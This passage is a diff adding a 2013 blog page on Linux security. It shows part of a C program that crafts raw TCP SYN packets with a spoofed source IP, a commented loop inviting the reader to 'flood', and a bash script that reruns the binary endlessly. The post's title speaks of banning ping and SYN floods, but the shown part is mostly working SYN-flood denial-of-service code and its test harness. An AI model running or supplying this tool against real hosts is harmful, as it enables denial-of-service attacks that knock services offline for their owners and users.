+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">54321</span><span class="p">);</span>  <span class="c1">//Id of this packet</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">frag_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ttl</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>      <span class="c1">//Set to 0 before calculating checksum</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>    <span class="c1">//Spoof the source ip address</span>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">,</span> <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">//TCP Header</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">dest</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">80</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">ack_seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>      <span class="cm">/* first and only tcp segment */</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">fin</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">syn</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">rst</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">psh</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">ack</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">urg</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">window</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">5840</span><span class="p">);</span> <span class="cm">/* maximum allowed window size */</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="cm">/* if you set a checksum to zero, your kernel&#39;s IP stack</span>
+</span><span class='line'><span class="cm">                should fill in the correct checksum during transmission */</span>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">urg_ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="c1">//Now the IP checksum</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">source_address</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>
+</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">dest_address</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">placeholder</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">psh</span><span class="p">.</span><span class="n">tcp_length</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">psh</span><span class="p">.</span><span class="n">tcp</span> <span class="p">,</span> <span class="n">tcph</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span><span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">psh</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">pseudo_header</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">//IP_HDRINCL to tell the kernel that headers are included in the packet</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">one</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">one</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">one</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>        <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Error setting IP_HDRINCL. Error number : %d . Error message : %s </span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">,</span> <span class="n">errno</span> <span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">//Uncommend the loop if you want to flood :)</span>
+</span><span class='line'>    <span class="c1">//while (1)</span>
+</span><span class='line'>    <span class="c1">//{</span>
+</span><span class='line'>        <span class="c1">//Send the packet</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">sendto</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span>      <span class="cm">/* our socket */</span>
+</span><span class='line'>                    <span class="n">datagram</span><span class="p">,</span>   <span class="cm">/* the buffer containing headers and data */</span>
+</span><span class='line'>                    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span><span class="p">,</span>    <span class="cm">/* total length of our datagram */</span>
+</span><span class='line'>                    <span class="mi">0</span><span class="p">,</span>      <span class="cm">/* routing flags, normally always 0 */</span>
+</span><span class='line'>                    <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span>   <span class="cm">/* socket addr, just like in */</span>
+</span><span class='line'>                    <span class="k">sizeof</span> <span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>       <span class="cm">/* a normal send() */</span>
+</span><span class='line'>        <span class="p">{</span>
+</span><span class='line'>            <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="c1">//Data send successfully</span>
+</span><span class='line'>        <span class="k">else</span>
+</span><span class='line'>        <span class="p">{</span>
+</span><span class='line'>            <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Packet Send </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>    <span class="c1">//}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>test start</h3>
+
+<h4>compile with gcc</h4>
+
+<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>indent -kr -i8 sysflood.c
+</span><span class='line'>gcc synflood.c -o synflood
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>test bash (Only running three seconds)</h4>
+
+<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'><span class="k">while</span> :
+</span><span class='line'><span class="k">do</span>
+</span><span class='line'>/path/to/synflood
+</span><span class='line'><span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>results</h4>
+
+<p><img src="/images/result_syn.jpg" alt="alt text" /><br />
+<img src="/images/flood_test.jpg" alt="alt text" /><br /></p>
+
+<h4>more&#8230;&#8230;</h4>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Taolinran</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-07T10:07:00+08:00" pubdate data-updated="true">May 7<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/linux-security/'>linux-security</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command/" data-via="linuxtaolinran" data-counturl="http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/05/02/controlling-the-nameserver/" title="Previous Post: Controlling the Nameserver">&laquo; Controlling the Nameserver</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><script type="text/javascript">
+/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+var disqus_shortname = 'linblog'; // required: replace example with your forum shortname
+
+/* * * DON'T EDIT BELOW THIS LINE * * */
+(function () {
+var s = document.createElement('script'); s.async = true;
+s.type = 'text/javascript';
+s.src = 'http://' + disqus_shortname + '.disqus.com/count.js';
+(document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script> 
+
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <script charset="Shift_JIS" src="http://chabudai.sakura.ne.jp/blogparts/honehoneclock/honehone_clock_tr.js"></script>
+<iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=1&ptype=1&speed=300&skin=10&isTitle=1&noborder=1&isWeibo=1&isFans=0&uid=2116612302&verifier=c3e417d3&dpc=1"></iframe><section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2013/05/07/the-art-of-banning-ping-command/">The Art of Banning Ping Command and SYN Flood</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/05/02/controlling-the-nameserver/">Controlling the Nameserver</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/05/01/happy-51/">happy 51</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/04/25/master-slash-slave-dns-server-base-on-tsig/">M/S Split DNS Based on TSIG</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/04/15/this-site/">about my site</a>
+      </li>
+    
+  </ul>
+</section>
+<!--
+<section>
+  <h1>Categories</h1>
+  <ul id="categories">
+    <li class='category'><a href='/blog/categories/linux-security/'>linux-security (1)</a></li>
+<li class='category'><a href='/blog/categories/linux-services/'>linux-services (2)</a></li>
+<li class='category'><a href='/blog/categories/tittle-tattle/'>tittle-tattle (3)</a></li>
+
+  </ul>
+</section>
+-->
+<section>
+  <h1>Categories</h1>
+    <ul id="category-list"><li class='category'><a href='/blog/categories/linux-security/'>linux-security (1)</a></li>
+<li class='category'><a href='/blog/categories/linux-services/'>linux-services (2)</a></li>
+<li class='category'><a href='/blog/categories/tittle-tattle/'>tittle-tattle (3)</a></li>
+</ul>
+</section><section>
+  <h1>Nice links</h1>
+  <ul>
+    <li>
+      <a href="http://coolshell.cn/" target="_blank"><img src="/images/logo/coolshell.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://www.infoq.com/" target="_blank"><img src="/images/logo/infoQ.jpg" /></a>
+    </li>
+    <li>
+      <a href="http://dbanotes.net/" target="_blank"><img src="/images/logo/dbanotes.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://www.dbthink.com/" target="_blank"><img src="/images/logo/dbthink.jpg" /></a>
+    </li>
+	 <li>
+      <a href="http://www.mysqlpub.com/forum.php" target="_blank"><img src="/images/logo/mysqlpub.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://mindhacks.cn/" target="_blank"><img src="/images/logo/mindhacks.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://blog.linuxhonker.com/" target="_blank"><img src="/images/logo/linuxhonker.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://blog.yufeng.info/" target="_blank"><img src="/images/logo/yufeng.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://www.commandlinefu.com/commands/browse" target="_blank"><img src="/images/logo/commandline.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://www.jiagulun.com/" target="_blank"><img src="/images/logo/jiagulun.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://blog.csdn.net/signmem" target="_blank"><img src="/images/logo/TerryTsang.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://kumu-linux.github.io/" target="_blank"><img src="/images/logo/kumulinux.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://blog.sina.com.cn/u/2116612302" target="_blank"><img src="/images/logo/sina.jpg" /></a>
+    </li>
+	<li>
+      <a href="http://blog.csdn.net/c__ilikeyouma" target="_blank"><img src="/images/logo/csdn.jpg" /></a>
+    </li>	
+  </ul>
+</section>
+
+<section class="googleplus">
+  <h1>
+    <a href="https://plus.google.com/113704455548006694120?rel=author">
+      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
+      Google+
+    </a>
+  </h1>
+</section>
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - Taolinran -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'linblog';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command/';
+        var disqus_url = 'http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
